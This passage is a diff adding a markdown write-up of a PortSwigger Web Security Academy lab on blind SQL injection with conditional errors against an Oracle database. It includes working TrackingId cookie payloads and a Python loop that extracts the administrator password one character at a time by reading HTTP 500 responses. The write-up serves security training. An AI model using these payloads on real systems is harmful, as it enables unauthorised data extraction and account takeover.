@@ -227,6 +227,47 @@ Identify the database type and version of a backend system running either MySQL 
 ---
 
 
+# 🛡️ PortSwigger Web Security Academy: Blind SQLi with Conditional Errors
+
+## 📝 Lab Description
+This lab contains a blind SQL injection vulnerability where the application uses a tracking cookie (`TrackingId`) to determine session behavior. The backend database uses **Oracle**, and the application does not return SQL errors or distinct changes in the response text when a query fails or succeeds normally. Instead, conditional errors must be forced inside the database to determine boolean truths based on **HTTP Status Codes**.
+
+* **Objective:** Extract the 20-character alphanumeric password for the `administrator` user and log in.
+* **Database Engine:** Oracle
+
+---
+
+## 🚀 Exploitation Methodology
+
+### 1. Manual Verification (Fingerprinting)
+By intercepting requests via **Burp Suite**, I verified that injecting an invalid Oracle mathematical operation inside a conditional statement forces an internal database exception, resulting in an **HTTP 500 Internal Server Error**:
+* **True Condition (HTTP 500):** `TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'`
+* **False Condition (HTTP 200 OK):** `TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'`
+
+### 2. Automation via Custom Python Script
+To scale the exploit efficiently without hammering a standard intruder tool, I developed a custom Python multi-character tracking script utilizing the `requests` library. 
+
+The script targeted individual character indices using Oracle's `SUBSTR` function, monitored the specific response status codes, and appended valid matches sequentially when an HTTP 500 was registered.
+
+```python
+# Core logic snippet used for the automated character extraction loop:
+for position in range(1, 21):
+    for char in CHARSET:
+        payload = f"{TRACKING_ID}'||(SELECT CASE WHEN (SUBSTR(password,{position},1)='{char}') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
+        
+        status_code = make_request(payload)
+        
+        if status_code == 500:
+            extracted_password += char
+            break
+```
+
+---
+
+## 🏆 Key Takeaways & Skills Learned
+* **Oracle SQL Syntax Mechanics:** Mastered string concatenation (`||`) and conditional statement syntax (`CASE WHEN ... THEN ... ELSE ... END`) native to Oracle infrastructure.
+* **Error-Based Logic:** Leveraged intentional database execution failures (`TO_CHAR(1/0)`) to extract information without any visible data reflections or application-level output differences.
+* **Script Optimization & Troubleshooting:** Resolved structural Python string anomalies, managed active session state variables, and accounted for uppercase variations inside automated loops.
 
 
 
